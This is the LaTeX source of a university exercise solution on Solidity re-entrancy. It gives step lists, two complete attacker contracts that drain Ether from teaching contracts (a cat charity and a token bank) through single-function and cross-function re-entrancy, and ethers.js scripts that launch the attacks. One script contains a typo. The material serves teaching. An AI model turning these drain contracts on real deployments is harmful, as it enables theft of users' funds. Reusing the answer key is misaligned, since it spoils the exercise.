\documentclass[12pt]{article}
\usepackage[utf8]{inputenc}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{geometry}
\usepackage{listings-solidity}  % Include Solidity highlighting
\usepackage{minted} % For advanced code listings

% Define a custom minted style (optional)
\usemintedstyle{colorful} % You can choose from various styles like 'monokai', 'tango', 'colorful', etc.

% Custom color setup
\definecolor{bashtextcolor}{RGB}{0, 0, 0} % Define black color

% Define a new command for inline code using minted
\newcommand{\codeinline}[1]{\mintinline{text}{#1}}

\geometry{a4paper, margin=1in}

\title{Smart Contracts Exercise 05: \\ Re-Entrancy -- Solution}
\author{}
\date{}

% Define a new command for inline code with a dark background
\newcommand{\codeblack}[1]{%
  \texttt{\colorbox{black!7}{\textcolor{black}{#1}}}%
}

% Define a new command for inline code with a dark background
\newcommand{\codegrey}[1]{%
  \texttt{\colorbox{black!4}{\textcolor{black}{#1}}}%
}

% Define custom colors (optional)
\definecolor{myURLColor}{RGB}{0, 102, 204} % Example: A shade of blue

\hypersetup{
    colorlinks=true,        % Enable colored links
    linkcolor=blue,         % Color for internal links (e.g., \ref, \cite)
    citecolor=blue,         % Color for citations
    filecolor=magenta,      % Color for file links
    urlcolor=myURLColor     % Color for external URLs
}

% Define a style for code listings
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{lightgray!20},   
    commentstyle=\color{green!50!black},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{gray},
    stringstyle=\color{red},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}
% Adding package for header and footer
\usepackage{fancyhdr}
\pagestyle{fancy}

% Define header and footer
\fancyhf{} % Clear current settings
\fancyhead[L]{Smart Contracts Exercise 05} % Left header
\fancyhead[R]{\thepage} % Right header with page number

\renewcommand{\headrulewidth}{0.4pt} % Line below header
% \renewcommand{\footrulewidth}{0.4pt} % Line above footer

\begin{document}

\maketitle

\noindent
The solved exercise 5 can be found in this \href{https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/05-Re-Entrancy/solution/solution-code?ref_type=heads}{GitLab repository}.

\subsection*{Task 1: Cat Charity Hijinks}

\begin{enumerate}
  \item The attacker sends a small donation to the \texttt{CatCharity} contract to record their donation.
  \item The attacker immediately calls the \texttt{claimRefund} function, triggering the re-entrancy vulnerability.
  \item While the \texttt{claimRefund} function is executing, the attacker's contract falls back into the \texttt{claimRefund} function multiple times, draining the \texttt{CatCharity} contract's Ether balance.
  \item This attack continues until the charity's balance is completely drained, and the funds are transferred to the attacker.
\end{enumerate}

\noindent
\begin{minipage}{\textwidth}
\begin{lstlisting}[language=Solidity]
contract CatAttacker {
    CatCharity public catCharity;

    constructor(address _catCharityAddress) {
        catCharity = CatCharity(_catCharityAddress);
    }

    /**
     * @notice Initiates the re-entrancy attack.
     * @dev We donate a small amount so that we (the Attacker contract)
     *      have a 'donation' recorded, then immediately claim the refund,
     *      re-entering until the charity's entire balance is drained.
     */
    function attack() external payable {
        // Step 1: Donate a tiny bit from this contract
        catCharity.donate{value: msg.value}();

        // Step 2: Start the refund loop
        catCharity.claimRefund();

        // Step 3: Send the money back to player
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // Fallback triggered whenever this contract receives Ether
    receive() external payable {
        // If there's still ETH left in the CatCharity, re-claim
        if (address(catCharity).balance > 0) {
            catCharity.claimRefund();
        }
    }
}
\end{lstlisting}
\end{minipage}

\noindent
JavaScript code to start the attack:

\noindent
\begin{minipage}{\textwidth}
\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
// 1) The player deploys the Attacker contract
catAttacker = await (await ethers.getContractFactory("CatAttacker", deployer))
       .deploy(catCharity.target)

// 2) The player calls `attack()` with a small donation to set up re-entrancy
//    We'll donate 0.5 ETH
await catAttacker.connect(player).attack({ value: 5n * 10n ** 17n });
// By the end of this transaction, the attacker contract's fallback
// will keep calling `claimRefund()` in a loop until the charity is drained.
\end{minted}
\end{minipage}

\subsection*{Task 2: CTU Token Bank}

In this task, the objective is to exploit a cross-function re-entrancy vulnerability in the \texttt{CTUTokenBank} contract. Here's how the exploit works:
\begin{enumerate}
    \item The attacker deposits Ether into the \texttt{CTUTokenBank}, which increases their balance in the contract.
    \item The attacker then calls the \texttt{withdrawEther} function, which is protected by a re-entrancy lock. However, while the lock is active, the attacker exploits a function that allows them to buy CTU Tokens (\texttt{buyTokens}) using the previous balance.
    \item The attacker repeats this process, buying more tokens and withdrawing Ether until they have drained the bank of its Ether balance.
    \item Finally, the attacker withdraws all remaining funds and transfers the stolen Ether to themselves.
\end{enumerate}

\noindent
\begin{minipage}{\textwidth}
\begin{lstlisting}[language=Solidity]
  /**
  * @title CTUTokenBankAttacker
  * @notice Demonstrates a cross-function reentrancy exploit on CTUTokenBank.
  *         Even though 'withdrawEther' is guarded by a reentrancy lock, 'buyTokens'
  *         is wide open. The attacker calls 'withdrawEther', and during the
  *         fallback--while the lock is active--calls 'buyTokens' using the *old*
  *         balance that hasn't yet been subtracted.
  */
 contract CTUTokenBankAttacker {
     ICTUTokenBank public ctuBank;
     ICTUToken public ctuToken;
     address public owner;
     bool private alreadyCalled;
 
     constructor(address _ctuBank, address _ctuToken) {
         ctuBank = ICTUTokenBank(_ctuBank);
         ctuToken = ICTUToken(_ctuToken);
         owner = msg.sender;
         alreadyCalled = false;
     }
 
     function attack() external payable {
         require(msg.sender == owner, "Not owner");
         
         // 1) Deposit Ether into the bank
         ctuBank.depositEther{value: msg.value}();
 
         // 2) Start a withdrawal, which will send Ether back to this contract
         ctuBank.withdrawEther();
 
         // 3) Sell the CTU Tokens to the bank
         ctuToken.approve(address(ctuBank), ctuToken.balanceOf(address(this)));
         ctuBank.sellTokens(ctuToken.balanceOf(address(this)));
 
         // 4) Withdraw the Ether again
         ctuBank.withdrawEther();
 
         // 5) Repeat the attack one more time
         alreadyCalled = false;
         ctuBank.depositEther{value: 5 ether}();
         ctuBank.withdrawEther();
         ctuToken.approve(address(ctuBank), 5 * 10 ** 18);
         ctuBank.sellTokens(ctuToken.balanceOf(address(this)));
         ctuBank.withdrawEther();
 
         // 6) Transfer the stolen funds to the player
         payable(owner).transfer(address(this).balance);
     }

     receive () external payable {
         if (!alreadyCalled) {
             alreadyCalled = true;
             ctuBank.buyTokens();
         }
     }
 
 }
\end{lstlisting}
\end{minipage}

\noindent
JavaScript code to start the attack:

\noindent
\begin{minipage}{\textwidth}
\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
// Deploy the attack contract
const attackerContractFactory = 
  await ethers.getContractFactory("CTUTokenBankAttacker", player);
const attackerContract = 
  await attackerContractFactory.deploy(bank.target, token.targe)
// Execute the attack with 5 Ethers
await attackerContract.attack({ value: 5n * 10n ** 18n });
\end{minted}
\end{minipage}

\end{document}
